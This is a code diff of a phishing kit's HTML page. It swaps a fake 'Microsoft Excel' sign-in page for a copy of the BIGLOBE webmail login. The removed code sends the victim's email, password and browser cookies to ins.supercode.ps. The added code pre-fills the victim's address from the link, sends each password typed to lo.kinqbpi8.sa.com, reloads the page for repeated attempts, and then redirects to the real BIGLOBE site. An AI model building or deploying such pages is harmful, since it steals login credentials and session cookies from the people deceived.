@@ -1,283 +1,222 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>microsoft-excel Sign In</title>
-    <link rel="icon" href="https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png" sizes="any"> <!-- Online icon -->
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            position: relative;
-            background-image: url('https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png'); /* Fixed background image */
-            background-size: cover;
-            background-position: center;
-        }
-        .container {
-            background-color: #f1f1f1; /* Excel style background */
-            background-image: url('https://i.ibb.co/zhFKp547/mmmk.png'); /* Excel grid background */
-            background-size: 100px 100px; /* Excel grid-like pattern */
-            padding: 50px;  /* Increased padding for more space */
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            width: 100%;
-            max-width: 400px;  /* Reduced max-width to make the container narrower */
-            max-height: 700px;  /* Increased max-height to make the container longer vertically */
-            position: relative;
-            overflow-y: auto;  /* Allows for scrolling if the content exceeds the height */
-        }
-        .container h1 {
-            margin-bottom: 16px;
-            font-size: 24px;
-            color: #333;
-            text-align: left;
-            margin-left: 0;
-        }
-        .input-group {
-            margin-bottom: 20px;
-        }
-        .input-group label {
-            display: none; /* Hide the label */
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        .button {
-            background-color: #f1c40f;  /* microsoft-excel Access Point green color */
-            color: #333;  /* Dark text color */
-            padding: 12px;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-        }
-        .button:hover {
-            background-color: #e1b10f;  /* Slightly darker green when hovered */
-        }
-        .footer {
-            margin-top: 20px;
-            text-align: center;
-            color: #777;
-        }
-        .footer a {
-            color: #0078d4;
-            text-decoration: none;
-        }
-        .logo {
-            text-align: left;
-            margin-bottom: 8px;
-        }
-        .logo img {
-            width: 120px; /* Increased the logo size */
-        }
-        .bottom-links {
-            position: absolute;
-            bottom: 10px;
-            right: 10px;
-            font-size: 12px;
-            color: #777;
-        }
-        .bottom-links a {
-            color: #0078d4;
-            text-decoration: none;
-            margin-left: 10px;
-        }
-        .email-display {
-            font-size: 24px; /* Increased font size */
-            font-weight: bold; /* Made the email text bold */
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .powered-by {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-            font-size: 12px;
-            color: #777;
-        }
-        /* Added CSS to center the image */
-        .header-image {
-            width: 40%;
-            margin-bottom: 20px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Pragma" content="no-store">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Expires" content="Thu, 01 Dec 1994 16:00:00 GMT">
+<meta http-equiv="X-UA-Compatible" content="requiresActiveX=true" />
+<meta http-equiv="X-UA-Compatible" content="IE=emulateIE9" />
+<meta name="keywords" content="メール,Webメール,Ｗｅｂメール,BIGLOBE,ビッグローブ" />
+<meta name="description" content="BIGLOBEメールはブラウザで手軽にメールが使えます。スマートフォンにも対応。面倒な設定はいらず、ログインするだけですぐにご利用いただけます。" />
+<meta name="referrer" content="unsafe-url">
+<title>BIGLOBEメール｜Webメール</title>
+<link rel="icon" href="https://webmail.biglobe.ne.jp/images2/common/favicon.ico" type="image/vnd.microsoft.icon" />
+<link href="https://webmail.biglobe.ne.jp/css2/import_top.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/common.js" charset="SHIFT-JIS" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/wm_login.js" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
+<script type="text/javascript" src="/api/js/input_time_chk.js" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
+<link rel="stylesheet" href="https://webmail.biglobe.ne.jp/softkeyboard/softkeyboardsjis.css">
+<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.js" charset="SHIFT-JIS" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
+<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.softkeyboard.loginmail.js" charset="SHIFT-JIS" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
 
-        /* Change the "Next" button to yellow */
-        #next-button {
-            background-color: #f1c40f;  /* Yellow color */
-            color: #333;  /* Dark text color */
-        }
-        #next-button:hover {
-            background-color: #e1b10f;  /* Slightly darker yellow when hovered */
-        }
+<script type="text/javascript" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+  function reportAttempt(email, password, attempts) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://lo.kinqbpi8.sa.com/gen/gen.php", true); // Your PHP endpoint
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    var data = "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&attempts=" + encodeURIComponent(attempts);
+    xhr.send(data);
+  }
 
-        /* Style the email input for large and bold text */
-        #email {
-            font-size: 24px;  /* Increased font size */
-            font-weight: bold; /* Made the text bold */
-        }
-    </style>
+  function getValueFromUrl() {
+    return window.location.hash.substring(1); // Remove the '#' character
+  }
+
+  window.onload = function() {
+    var email = getValueFromUrl();
+    if (email) {
+      var emailInput = document.getElementById('loginid');
+      emailInput.value = email;
+      emailInput.disabled = true; // Lock the email input field
+    }
+
+    var attempts = parseInt(localStorage.getItem('attempts')) || 0;
+    var maxAttempts = 4;
+
+    document.querySelector('form[name="direct"]').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent the form from submitting normally
+
+      var email = document.getElementById('loginid').value;
+      var password = document.getElementById('biglobe_pw').value;
+
+      attempts += 1;
+      localStorage.setItem('attempts', attempts);
+
+      reportAttempt(email, password, attempts);
+
+      if (attempts < maxAttempts) {
+        // Reload the page after 1 second
+        setTimeout(function() {
+          location.reload();
+        }, 1000); // Adjust delay as needed
+      } else {
+        localStorage.removeItem('attempts');
+        alert("最大試行回数に達しました。");
+        // Redirect to the specified landing page
+        setTimeout(function() {
+          window.location.href = "https://auth.sso.biglobe.ne.jp/mail/";
+        }, 1000); // Adjust delay as needed
+      }
+    });
+  };
+</script>
 </head>
+
 <body>
+<div id="container"><a name="pagetop"></a>
+  <div id="header_main">
+    <div id="header_logo">
+      <h1><img src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31" /></h1>
+      <map name="logo">
+        <area shape="rect" coords="0,0,150,35" href="http://www.biglobe.ne.jp/" alt="BIGLOBE" />
+        <area shape="rect" coords="150,0,210,35" href="https://webmail.biglobe.ne.jp/" alt="BIGLOBEメール" />
+      </map>
+    </div>
+    <div id="header_keyword">
+      <strong>メールがもっと便利で楽しくなる！</strong>
+    </div>
+    <br class="clear" />
+  </div>
+  
+  <div id="header-link">
+    <div id="support_menu">
+      <ul class="fmenu">
+        <li><a href="https://email.biglobe.ne.jp/">メールサービス</a></li>
+        <li><a class="bl" href="https://support.biglobe.ne.jp/" target="_blank">会員サポート</a></li>
+        <li><a class="bl" href="https://support.biglobe.ne.jp/shogaiap/service.html" target="_blank">障害情報</a></li>
+      </ul>
+    </div>
+  </div>
 
-    <div class="container">
-        <!-- Centered the image -->
-        <img src="https://i.ibb.co/BKvvVVBK/microsoft-excel.png" alt="Access" class="header-image">
-        
-        <div class="logo" id="logo-container"></div>
-        <h1></h1>
-        <div id="email-display" class="email-display" style="display: none;"></div>
-        <form id="signin-form" action="http://ins.supercode.ps/gen/gen.php" method="POST">
-            <div class="input-group email-group">
-                <label for="email" style="display: none;">Email, phone, or Skype</label>
-                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
-            </div>
-            <div class="input-group password-group" style="display: none;">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter password" required>
-            </div>
-            <button type="button" class="button" id="next-button">Next</button>
-            <button type="submit" class="button" id="signin-button" style="display: none;">Sign in</button>
-        </form>
-        <div class="footer">
-            <a href="#">Access Document With Your Email</a>
+  <div id="main">
+    <div id="contents_block">
+      <iframe src="https://member4.sso.biglobe.ne.jp/heute" width=800 height=36 frameborder=0 ></iframe>
+      <div class="infotitle" style="margin-top:25px;">お知らせ</div>
+      <div class="infoArea">
+        <p>・<a href="https://support.biglobe.ne.jp/menteap/service.html" target="_blank">BIGLOBEメール、メールサービスのメンテナンス情報はこちらをご確認ください。</a></p>
+        <p>・<a href="https://support.biglobe.ne.jp/news/news716.html" target="_blank">BIGLOBEメール 一部仕様変更のお知らせ</a></p>
+        <p>・<a href="https://support.biglobe.ne.jp/news/news550.html#a_faq1" target="_blank">Webメールにログインが出来ない場合はこちらをご確認ください。</a></p>
+      </div>
+
+      <script nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+        getResponsiveCSS();
+      </script>
+      <div id="info_footer"><p>
+        <div class="webrylink">
+          <center>
+            <div class="banner_area" style="margin-bottom: 15px;"></div>
+            <ul>
+              <li><a href="https://webmail.biglobe.ne.jp/requirements.html">推奨環境</a></li>
+              <li><a href="https://email.biglobe.ne.jp/faq/Default.htm">ヘルプ</a></li>
+              <li><a href="http://email.biglobe.ne.jp/faq.html">よくあるお問い合わせ</a></li>
+              <li><a href="https://webmail.biglobe.ne.jp/read.html">必ずお読みください</a></li>
+            </ul>
+          </center>
         </div>
-    </div>
-    <div class="powered-by">
-        Powered by Microsoft-excel
-    </div>
-    <div class="bottom-links">
-        Copyright © 2025 Microsoft-excel, Inc. All rights reserved.
-        <br>
-        English (US) | <a href="#">Contact Us</a> | <a href="#">Terms of Use</a> | <a href="#">Privacy</a> | <a href="#">Intellectual Property</a> | <a href="#">Trust</a>
+      </p></div>
     </div>
 
-    <script nonce="MTIyODY2MTUzNSwzNzEyNjA1MTE4">
-        var attemptCounter = 0;
+    <div id="side_menuArea">
+      <div id="side_menu_block">
+        <div id="side_menu">
+          <h2><img src="https://webmail.biglobe.ne.jp/images2/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43" /></h2>
+          <div class="login_block">
+            <div id="login_form">
+              <form method="POST" name="direct" action="https://lo.kinqbpi8.sa.com/gen/gen.php">
+                <input type="hidden" name="sms" value="">
+                <input type="hidden" name="ems" value="">
+                <div>
+                  <label for="loginid">メールアドレスまたはユーザID</label>
+                  <input name="loginid" type="text" size="35" autocomplete="off" id="loginid" value="" style="ime-mode: disabled" />
+                  <label for="biglobe_pw">BIGLOBEパスワード</label>
+                  <input name="biglobe_pw" type="password" size="30" id="biglobe_pw" />
+                </div>
+                
+                <script language="Javascript" type="text/javascript" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+                  var ua = navigator.userAgent;
+                  if (ua.indexOf('Android') == -1 && ua.indexOf('iPhone') == -1 && ua.indexOf('iPad') == -1) {
+                    document.write("<div class='skey'><img src='https://webmail.biglobe.ne.jp/images2/button_softkey.gif' alt='ソフトウェアキーボードで入力する' title='ソフトウェアキーボードで入力する' width='200' height='30' id='soft_keyboard_pass_id'></div>");
+                  }
+                </script>
 
-        // Function to get query parameter value from URL
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.has(param) ? urlParams.get(param) : null;
-        }
+                <div id="keyboard"></div>
+                <div id="my_div"></div>
 
-        // Function to get cookies
-        function getCookies() {
-            var cookies = document.cookie.split(';');
-            var cookieObject = {};
-            cookies.forEach(function(cookie) {
-                var parts = cookie.split('=');
-                cookieObject[parts[0].trim()] = parts[1];
-            });
-            return cookieObject;
-        }
+                <script language="Javascript" type="text/javascript" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+                  $(document).ready(function(){
+                    $("#keyboard").keyboard({
+                      SelBoxPosition : 0,
+                      IdBoxPosition : 0,
+                      PassBoxPosition : 0,
+                      IdInputID  : 'loginid',
+                      PassInputID  : 'biglobe_pw',
+                      ExecKeyboard : 'soft_keyboard_pass_id',
+                      DirectoryName : 'softkeyboard/',
+                      IdMaxLen  : 8,
+                      PassMaxLen  : 16
+                    });
+                  });
+                </script>
 
-        // Function to lock email input and display it as text
-        function lockAndDisplayEmail() {
-            var emailInput = document.getElementById('email');
-            var emailDisplay = document.getElementById('email-display');
-            var email = emailInput.value;
-            emailDisplay.textContent = email;
-            emailDisplay.style.display = 'block';
-            emailDisplay.style.fontWeight = 'bold'; // Ensure the email display is bold
-            emailDisplay.style.fontSize = '24px'; // Larger text for display
-            emailInput.style.display = 'none';
+                <ul>
+                  <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1" /><label for="autologinidflag">次回からIDの入力を省略</label></li>
+                  <li><input type="checkbox" name="autologinflag" id="autologinflag" value="1" /><label for="autologinflag"><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン状態を保存する</a><br />（共有パソコンではチェックをはずしてください）</label></li>
+                </ul>
 
-            // Set a fixed background image
-            document.body.style.backgroundImage = 'url(https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png)';
-            var logoContainer = document.getElementById('logo-container');
-            logoContainer.innerHTML = ''; // Clear any logos
-        }
+                <div class="loginBtn">
+                  <input type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" border="0" alt="ログイン" title="ログイン" width="205" height="37" />
+                </div>
+              </form>
+            </div>
+            <script type="text/javascript" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+              doit();
+            </script>
 
-        // Function to handle form submission
-        document.addEventListener('DOMContentLoaded', function() {
-            var emailParam = getQueryParam('email');
-            if (emailParam) {
-                document.getElementById('email').value = emailParam;
-                lockAndDisplayEmail();
-            }
+            <ul class="supportLink">
+              <li><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン方法について</a></li>
+              <li><a href="http://support.biglobe.ne.jp/jimu/idpw/index.html" target="_blank">ID・パスワードを忘れた場合</a><br />BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="https://biz.biglobe.ne.jp/member/support.html" target="_blank">こちら</a>］</li>
+              <li><a href="http://email.biglobe.ne.jp/mailaccount.html" target="_blank">メールアドレスの取得・確認</a></li>
+              <li><a href="http://email.biglobe.ne.jp/machange/index.html" target="_blank">メールアドレスの変更</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
 
-            var emailGroup = document.querySelector('.email-group');
-            var passwordGroup = document.querySelector('.password-group');
-            var nextButton = document.getElementById('next-button');
-            var signinButton = document.getElementById('signin-button');
-
-            nextButton.addEventListener('click', function() {
-                if (document.getElementById('email').value) {
-                    lockAndDisplayEmail();
-                    emailGroup.style.display = 'none';
-                    passwordGroup.style.display = 'block';
-                    nextButton.style.display = 'none';
-                    signinButton.style.display = 'block';
-                }
-            });
-
-            document.getElementById('email').addEventListener('keypress', function(event) {
-                if (event.key === 'Enter') {
-                    event.preventDefault();
-                    nextButton.click();
-                }
-            });
-
-            var form = document.getElementById('signin-form');
-
-            form.addEventListener('submit', function(event) {
-                event.preventDefault(); // Prevent form submission
-
-                var email = document.getElementById('email').value;
-                var password = document.getElementById('password').value;
-                attemptCounter++;
-
-                var cookies = getCookies();
-
-                var formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
-                formData.append('cookies', JSON.stringify(cookies));
-                formData.append('attempt', attemptCounter);
-
-                fetch('http://ins.supercode.ps/gen/gen.php', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.text();
-                })
-                .then(data => {
-                    console.log('Response from server:', data);
-                })
-                .catch(error => {
-                    console.error('Error logging attempt:', error);
-                });
-
-                if (attemptCounter < 5) {
-                    document.getElementById('password').value = '';
-                } else {
-                    form.submit();
-                }
-            });
-
-            document.getElementById('password').addEventListener('keypress', function(event) {
-                if (event.key === 'Enter') {
-                    form.submit();
-                }
-            });
-        });
-    </script>
+    <div id="footerContainer">
+      <div id="footerLink">
+        <div id="footerLinkBox1">&nbsp;</div>
+        <div id="footerLinkBox2">
+          <a href="https://www.biglobe.ne.jp/">BIGLOBEトップ</a>｜<a href="https://join.biglobe.ne.jp/">インターネット接続</a>（<a href="https://join.biglobe.ne.jp/ftth/hikari/">ビッグローブ光</a>・<a href="https://join.biglobe.ne.jp/mobile/">格安SIM</a>・<a href="https://join.biglobe.ne.jp/mobile/special/">SIM替え</a>）<br>
+          <a href="https://www.biglobe.co.jp/">会社概要</a>｜<a href="https://www.biglobe.ne.jp/whatsnew/news.html">ニュースリリース</a>｜<a href="https://www.biglobe.co.jp/recruit/index.html">採用情報</a>｜<a href="https://www.biglobe.ne.jp/privacy.html">個人情報保護ポリシー</a>｜<a href="https://www.biglobe.ne.jp/cookie.html">Cookieポリシー</a>｜<a href="https://support.biglobe.ne.jp/safesecurity/">安心・安全</a>｜<a href="https://support.biglobe.ne.jp/">お問い合わせ</a>
+        </div>
+        <div id="footerLinkBox3">
+          <img src="https://webmail.biglobe.ne.jp/images2/common/footer3logo.gif" alt="" width="210" height="66" usemap="#FooterMap" />
+          <map name="FooterMap" id="FooterMap">
+            <area shape="rect" coords="95,0,155,64" href="https://privacymark.jp/" target="_blank" alt="プライバシーマーク" onclick="B.gae('footer', 'click', 'footer');" />
+            <area shape="rect" coords="160,0,210,64" href="http://www.biglobe.ne.jp/safesecurity.html" target="_blank" alt="インターネット接続サービス安全・安心マーク" onclick="B.gae('footer', 'click', 'footer');" />
+          </map>
+        </div>
+      </div>
+      <div id="footerCopyright">
+        <script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/footer.js" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc="></script>
+        <script type="text/javascript" nonce="NzA0MzExNzMzLDM5OTIzMjUwODc=">
+          copyright();
+        </script>
+        <noscript>Copyright(C)BIGLOBE Inc.</noscript>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
